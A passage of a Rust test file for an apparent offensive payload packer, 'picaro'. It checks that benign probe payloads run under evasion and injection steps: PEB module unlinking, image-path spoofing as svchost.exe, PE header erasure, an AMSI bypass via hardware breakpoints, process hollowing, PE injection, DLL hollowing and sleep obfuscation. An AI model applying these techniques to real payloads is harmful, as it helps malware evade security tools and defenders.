    let source = payload.display().to_string().replace('\\', "/");
    let args_yaml: String = args
        .iter()
        .map(|arg| format!("      - \"{arg}\"\n"))
        .collect();
    let plan = format!(
        r#"schema: 6
name: {name}
build:
  payloads:
    probe:
      source: "{source}"
      args:
{args_yaml}  output:
    path: ./dist/{name}.exe
runtime:
{preparation}  - technique: reflective_loading
    params: {{ payload: probe }}
"#
    );
    let plan_path = std::env::temp_dir().join(format!("picaro_probe_{name}.yaml"));
    std::fs::write(&plan_path, plan).expect("write the temp plan");

    let output = Command::new(env!("CARGO_BIN_EXE_picaro"))
        .args(["build", plan_path.to_str().expect("utf-8 plan path")])
        .output()
        .expect("run picaro build");
    assert!(
        output.status.success(),
        "{name}: build failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    PathBuf::from(format!("dist/{name}.exe"))
}

/// Runs a packed probe artifact and returns its stdout.
#[cfg(feature = "live-tests")]
fn run_probe(artifact: &Path) -> String {
    let run = Command::new(artifact)
        .output()
        .expect("run the probe artifact");
    let stdout = String::from_utf8_lossy(&run.stdout).to_string();
    assert!(
        run.status.success(),
        "the probe failed: stdout={stdout} stderr={}",
        String::from_utf8_lossy(&run.stderr)
    );
    stdout
}

/// `hide_module` unlinks the loader from the PEB loader lists: the userland
/// module enumerator stops reporting the image while its header stays intact.
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc, the compiled dependencies and a Windows host"]
fn hide_module_unlinks_the_loader_from_the_module_list() {
    if !cfg!(windows) {
        return;
    }
    let payload = build_probe_payload();
    let control = run_probe(&pack_probe("probe_hide_control", "", &["self"], &payload));
    assert!(
        control.contains("PROBE loader_listed=yes"),
        "control: {control}"
    );

    let hidden = run_probe(&pack_probe(
        "probe_hide_module",
        "  - technique: hide_module\n",
        &["self"],
        &payload,
    ));
    assert!(
        hidden.contains("PROBE loader_listed=no"),
        "hide_module: {hidden}"
    );
    assert!(
        hidden.contains("PROBE header=intact"),
        "the header must stay intact: {hidden}"
    );
}

/// `image_path_spoofing` repoints the PEB `ImagePathName`, so the image path
/// `GetModuleFileNameW(NULL)` reports is the decoy.
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc, the compiled dependencies and a Windows host"]
fn image_path_spoofing_repoints_the_reported_image() {
    if !cfg!(windows) {
        return;
    }
    let payload = build_probe_payload();
    let control = run_probe(&pack_probe("probe_path_control", "", &["self"], &payload));
    assert!(
        control.contains("PROBE image_path=") && control.contains("probe_path_control.exe"),
        "control: {control}"
    );

    let spoofed = run_probe(&pack_probe(
        "probe_path_spoof",
        "  - technique: image_path_spoofing\n    params:\n      path: \"C:\\\\Windows\\\\System32\\\\svchost.exe\"\n",
        &["self"],
        &payload,
    ));
    assert!(
        spoofed.contains("PROBE peb_image_path=C:\\Windows\\System32\\svchost.exe"),
        "image_path_spoofing: {spoofed}"
    );
    // Measured on Windows 11 26200: `GetModuleFileNameW(NULL)` resolves the main
    // module through the loader list, not through this PEB field, so it keeps
    // reporting the real path. What the technique fools is the PEB readers.
    assert!(
        spoofed.contains("PROBE image_path=") && spoofed.contains("probe_path_spoof.exe"),
        "GetModuleFileNameW(NULL) is expected to keep reporting the real path: {spoofed}"
    );
}

/// `erase_pe_header` zeroes the loader image's in-memory PE header: the probe's
/// signature check fails while the process keeps running.
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc, the compiled dependencies and a Windows host"]
fn erase_pe_header_zeroes_the_loader_header() {
    if !cfg!(windows) {
        return;
    }
    let payload = build_probe_payload();
    let control = run_probe(&pack_probe("probe_header_control", "", &["self"], &payload));
    assert!(
        control.contains("PROBE header=intact"),
        "control: {control}"
    );

    let erased = run_probe(&pack_probe(
        "probe_header_erased",
        "  - technique: erase_pe_header\n",
        &["self"],
        &payload,
    ));
    assert!(
        erased.contains("PROBE header=erased"),
        "erase_pe_header: {erased}"
    );
}

/// Compiles a minimal **unsigned** `cdylib` once and returns its path.
#[cfg(feature = "live-tests")]
fn build_unsigned_dll() -> PathBuf {
    static BUILT: std::sync::OnceLock<PathBuf> = std::sync::OnceLock::new();
    BUILT
        .get_or_init(|| {
            let src =
                std::env::temp_dir().join(format!("picaro_probe_dll_{}.rs", std::process::id()));
            std::fs::write(
                &src,
                "#[no_mangle]\npub extern \"system\" fn picaro_probe_dll() -> i32 { 7 }\n",
            )
            .expect("write the probe DLL source");
            let dll = std::env::temp_dir()
                .join(format!("picaro_probe_unsigned_{}.dll", std::process::id()));
            let status = Command::new("rustc")
                .arg(&src)
                .args(["--crate-type", "cdylib", "-O", "-o"])
                .arg(&dll)
                .status()
                .expect("run rustc to build the unsigned DLL");
            assert!(status.success(), "the unsigned DLL must compile");
            dll
        })
        .clone()
}

/// `process_mitigations` (BlockDLLs) refuses to map a DLL that is not signed by
/// Microsoft: the probe's own unsigned cdylib loads without the step and fails
/// with it.
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc, the compiled dependencies and a Windows host"]
fn process_mitigations_block_unsigned_dlls() {
    if !cfg!(windows) {
        return;
    }
    let payload = build_probe_payload();
    let dll = build_unsigned_dll();
    let dll_arg = dll.display().to_string().replace('\\', "/");

    let control = run_probe(&pack_probe(
        "probe_dll_control",
        "",
        &["load", &dll_arg],
        &payload,
    ));
    assert!(control.contains("PROBE dll_load=ok"), "control: {control}");

    let blocked = run_probe(&pack_probe(
        "probe_dll_blocked",
        "  - technique: process_mitigations\n",
        &["load", &dll_arg],
        &payload,
    ));
    assert!(
        blocked.contains("PROBE dll_load=fail"),
        "process_mitigations: {blocked}"
    );
}

/// `hardware_breakpoints` answers `AmsiScanBuffer` at its entry: a call with a
/// null context returns `S_OK` with a clean out-parameter instead of the real
/// `E_INVALIDARG`, which proves the real function body never ran.
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc, the compiled dependencies and a Windows host"]
fn hardware_breakpoints_never_enter_the_real_amsi_scan() {
    if !cfg!(windows) {
        return;
    }
    let payload = build_probe_payload();
    let control = run_probe(&pack_probe("probe_amsi_control", "", &["amsi"], &payload));
    assert!(
        control.contains("PROBE amsi_status=0x80070057"),
        "control: {control}"
    );

    let armed = run_probe(&pack_probe(
        "probe_amsi_hwbp",
        "  - technique: hardware_breakpoints\n",
        &["amsi"],
        &payload,
    ));
    assert!(
        armed.contains("PROBE amsi_status=0x00000000"),
        "the trap did not answer the call: {armed}"
    );
    assert!(
        armed.contains("result=0x00000000"),
        "the clean result was not written to the caller's out-parameter: {armed}"
    );
}

// --- execution techniques without an e2e yet ---

/// Packs one payload with one Execution step (`step` is the runtime step's
/// YAML) and returns the artifact path.
#[cfg(feature = "live-tests")]
fn pack_execution(name: &str, source: &str, format: &str, args: &[&str], step: &str) -> PathBuf {
    let args_yaml: String = if args.is_empty() {
        String::new()
    } else {
        let items: String = args
            .iter()
            .map(|arg| format!("        - \"{arg}\"\n"))
            .collect();
        format!("      args:\n{items}")
    };
    let plan = format!(
        r#"schema: 6
name: {name}
build:
  payloads:
    payload:
      source: "{source}"
      format: {format}
{args_yaml}  output:
    path: ./dist/{name}.exe
runtime:
{step}"#
    );
    let plan_path = std::env::temp_dir().join(format!("picaro_exec_{name}.yaml"));
    std::fs::write(&plan_path, plan).expect("write the temp plan");

    let output = Command::new(env!("CARGO_BIN_EXE_picaro"))
        .args(["build", plan_path.to_str().expect("utf-8 plan path")])
        .output()
        .expect("run picaro build");
    assert!(
        output.status.success(),
        "{name}: build failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    PathBuf::from(format!("dist/{name}.exe"))
}

/// End-to-end: `pe_injection` maps the payload into a suspended `svchost.exe`
/// and relays its exit code. The marker and the `thread_local` value prove the
/// payload's TLS was provisioned on the target thread.
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc, the compiled dependencies and a Windows host"]
fn packs_and_runs_a_pe_injected_payload() {
    if !cfg!(windows) {
        return;
    }
    let payload = build_hollow_payload(None);
    let source = payload.display().to_string().replace('\\', "/");
    let artifact = pack_execution(
        "pe_injection_x64",
        &source,
        "pe",
        &["dist/pe_injection_x64.marker"],
        "  - technique: pe_injection\n    params:\n      payload: payload\n      target: \"C:\\\\Windows\\\\System32\\\\svchost.exe\"\n",
    );
    assert_hollowed_run(&artifact, "pe_injection_x64");
}

/// End-to-end: `dll_hollowing` runs raw shellcode from a signed module's
/// `.text` and relays its return value; the demo blob returns `42`.
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc, the compiled dependencies and a Windows host"]
fn packs_and_runs_a_dll_hollowed_payload() {
    if !cfg!(windows) {
        return;
    }
    let artifact = pack_execution(
        "dll_hollowing_x64",
        "examples/payloads/demo_shellcode.bin",
        "shellcode",
        &[],
        "  - technique: dll_hollowing\n    params: { module: wininet.dll }\n",
    );
    let run = Command::new(&artifact)
        .output()
        .expect("run the dll_hollowing artifact");
    assert_eq!(
        run.status.code(),
        Some(42),
        "the hollowed shellcode did not run: stdout={} stderr={}",
        String::from_utf8_lossy(&run.stdout),
        String::from_utf8_lossy(&run.stderr)
    );
}

/// Compiles `examples/payloads/test_tls_payload.rs` once and returns its path.
#[cfg(feature = "live-tests")]
fn build_tls_payload() -> PathBuf {
    static BUILT: std::sync::OnceLock<PathBuf> = std::sync::OnceLock::new();
    BUILT
        .get_or_init(|| {
            let src = Path::new(env!("CARGO_MANIFEST_DIR"))
                .join("examples")
                .join("payloads")
                .join("test_tls_payload.rs");
            let out =
                std::env::temp_dir().join(format!("picaro_tls_payload_{}.exe", std::process::id()));
            let status = Command::new("rustc")
                .arg(&src)
                .args(["-O", "-C", "strip=symbols", "-o"])
                .arg(&out)
                .status()
                .expect("run rustc to build the TLS payload");
            assert!(status.success(), "the TLS payload must compile");
            out
        })
        .clone()
}

/// Runs a packed TLS-payload artifact and asserts both markers: the payload's
/// `DLL_PROCESS_ATTACH` callback ran before its entry point, which is what the
/// stub's TLS provisioning is for.
#[cfg(feature = "live-tests")]
fn assert_tls_markers(name: &str, artifact: &Path) {
    let tls_marker = PathBuf::from(format!("dist/{name}.tls_marker"));
    let main_marker = PathBuf::from(format!("dist/{name}.main_marker"));
    let _ = std::fs::remove_file(&tls_marker);
    let _ = std::fs::remove_file(&main_marker);

    let run = Command::new(artifact)
        .env("PICARO_TLS_MARKER", &tls_marker)
        .output()
        .expect("run the TLS artifact");
    assert_eq!(
        run.status.code(),
        Some(42),
        "the payload's exit code was not relayed: stdout={} stderr={}",
        String::from_utf8_lossy(&run.stdout),
        String::from_utf8_lossy(&run.stderr)
    );

    let tls = std::fs::read_to_string(&tls_marker)
        .unwrap_or_else(|e| panic!("{name}: the TLS callback wrote no marker ({e})"));
    assert!(
        tls.contains("TLS_CALLBACK_MARKER_3b1f9d"),
        "{name}: unexpected TLS marker: {tls}"
    );
    let main = std::fs::read_to_string(&main_marker)
        .unwrap_or_else(|e| panic!("{name}: the entry point wrote no marker ({e})"));
    assert!(
        main.contains("MAIN_ENTRY_MARKER_a1c2e4"),
        "{name}: unexpected main marker: {main}"
    );
}

/// `process_hollowing` provisions the payload's TLS: its `DLL_PROCESS_ATTACH`
/// callback fires on the hollowed target's main thread before the entry point.
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc, the compiled dependencies and a Windows host"]
fn packs_and_runs_a_hollowed_payload_with_tls_callbacks() {
    if !cfg!(windows) {
        return;
    }
    let payload = build_tls_payload();
    let source = payload.display().to_string().replace('\\', "/");
    let artifact = pack_execution(
        "hollow_tls_x64",
        &source,
        "pe",
        &["dist/hollow_tls_x64.main_marker"],
        "  - technique: process_hollowing\n    params:\n      payload: payload\n      target: \"C:\\\\Windows\\\\System32\\\\svchost.exe\"\n",
    );
    assert_tls_markers("hollow_tls_x64", &artifact);
}

/// `pe_injection` provisions the payload's TLS through a target-resident
/// prologue: the callback runs before the entry thread's first instruction.
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc, the compiled dependencies and a Windows host"]
fn packs_and_runs_a_pe_injected_payload_with_tls_callbacks() {
    if !cfg!(windows) {
        return;
    }
    let payload = build_tls_payload();
    let source = payload.display().to_string().replace('\\', "/");
    let artifact = pack_execution(
        "pe_injection_tls_x64",
        &source,
        "pe",
        &["dist/pe_injection_tls_x64.main_marker"],
        "  - technique: pe_injection\n    params:\n      payload: payload\n      target: \"C:\\\\Windows\\\\System32\\\\svchost.exe\"\n",
    );
    assert_tls_markers("pe_injection_tls_x64", &artifact);
}

/// `hide_thread_from_debugger` is inert without a debugger: the step completes
/// and the chain still reaches the payload. The debugger-facing effect — a
/// hidden thread's debug events never reach the debugger — needs a debugger
/// attached and is recorded in `docs/measurements.md`.
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc, the compiled dependencies and a Windows host"]
fn hide_thread_from_debugger_is_inert_without_a_debugger() {
    if !cfg!(windows) {
        return;
    }
    let payload = build_probe_payload();
    let artifact = pack_probe(
        "hide_thread_dbg",
        "  - technique: hide_thread_from_debugger\n",
        &["self"],
        &payload,
    );
    let stdout = run_probe(&artifact);
    assert!(
        stdout.contains("PROBE image_path="),
        "the payload did not run after the preparation: {stdout}"
    );
}

/// `sleep_obfuscation`: the obfuscated sleep is a real wait of `sleep_ms` and
/// the chain still reaches the payload afterwards (the image is decrypted and
/// restored). What happens *during* the window — the whole image as RC4
/// ciphertext under `PAGE_READWRITE`, then a byte-exact restore — needs an
/// observer outside the process; `docs/measurements.md` has the sampler run.
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc, the compiled dependencies and a Windows host"]
fn sleep_obfuscation_sleeps_and_still_runs_the_payload() {
    if !cfg!(windows) {
        return;
    }
    let payload = build_probe_payload();
    let artifact = pack_probe(
        "sleep_obf_e2e",
        "  - technique: sleep_obfuscation\n    params:\n      sleep_ms: 1500\n",
        &["self"],
        &payload,
    );
    let started = std::time::Instant::now();
    let stdout = run_probe(&artifact);
    let elapsed = started.elapsed();
    assert!(
        stdout.contains("PROBE image_path="),
        "the payload did not run after the sleep: {stdout}"
    );
    assert!(
        elapsed >= std::time::Duration::from_millis(1400),
        "the obfuscated sleep did not take sleep_ms: {elapsed:?}"
    );
}
